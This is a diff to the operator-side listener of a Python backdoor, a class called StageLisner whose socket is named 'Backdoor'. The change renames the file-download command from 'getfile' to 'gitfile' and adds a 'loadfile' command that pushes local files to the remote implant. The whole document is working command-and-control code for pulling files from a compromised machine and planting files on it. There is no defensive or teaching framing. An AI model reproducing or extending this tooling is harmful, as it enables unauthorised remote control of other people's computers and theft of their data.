@@ -34,7 +34,7 @@ class StageLisner:
                 elif 'quit' in InPutCommand:
                       Backdoor.sendall(InPutCommand.encode(('latin-1'))) 
                       exit()   
-                elif 'getfile' in InPutCommand :
+                elif 'gitfile' in InPutCommand :
                     Backdoor.sendall(InPutCommand.encode(('latin-1')))              
                     LenDataFile =  Backdoor.recv(4)
                     LenDataFile = int.from_bytes(LenDataFile, byteorder='big')
@@ -46,6 +46,17 @@ class StageLisner:
                         FileDataGet += BytesBlock
                     with open(InPutCommand.split()[-1], 'wb') as file:
                         file.write(FileDataGet)
+                elif 'loadfile' in InPutCommand :
+                    try:
+                        Backdoor.sendall(InPutCommand.encode(('latin-1')))
+                        with open(InPutCommand.split()[-1],'rb') as FiLEUp:
+                            FiLEUp = FiLEUp.read()     
+                            Backdoor.send(len(FiLEUp).to_bytes(4, byteorder='big'))
+                            Backdoor.sendall(FiLEUp) 
+                    except FileNotFoundError:
+                        Backdoor.sendall('\n'.encode(('latin-1')))
+                        print(str(Data)+InPutCommand.split()[-1],' No such file or directory\n',end='', flush=True)
+
                 else:  
 
                     Backdoor.sendall(bytes(InPutCommand.encode(('latin-1'))))
